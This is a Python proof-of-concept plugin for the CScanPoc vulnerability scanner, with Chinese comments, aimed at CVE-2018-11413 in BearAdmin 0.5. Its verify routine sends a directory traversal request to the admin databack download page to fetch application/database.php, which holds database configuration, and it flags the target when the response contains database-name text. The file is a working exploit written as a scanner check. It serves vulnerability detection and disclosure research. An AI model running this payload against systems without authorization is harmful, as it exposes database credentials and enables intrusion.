# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'BearAdmin_0001'  # 平台漏洞编号
    name = 'BearAdmin任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2018-05-28'  # 漏洞公布时间
    desc = '''
    BearAdmin是一套基于ThinkPHP5和AdminLTE的后台管理系统。 
    BearAdmin 0.5版本中存在安全漏洞。远程攻击者可通过向/admin/databack/download.html页面发送带有目录遍历序列的‘name’参数利用该漏洞下载任意文件。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-10335'
    cnvd_id = 'CNVD-2018-10335'  # cnvd漏洞编号
    cve_id = 'CVE-2018-11413'  # cve编号
    product = 'BearAdmin'  # 漏洞组件名称
    product_version = '0.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f244746b-6adc-4935-8464-dbe550662991'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            self.output.info('尝试读取/application/database.php文件源码信息')
            payload = "/admin/databack/download.html?name=../application/database.php"
            vul_url = self.target + payload
            response = requests.get(vul_url)
            if response.status_code == 200 and '数据库名' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=vul_url))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
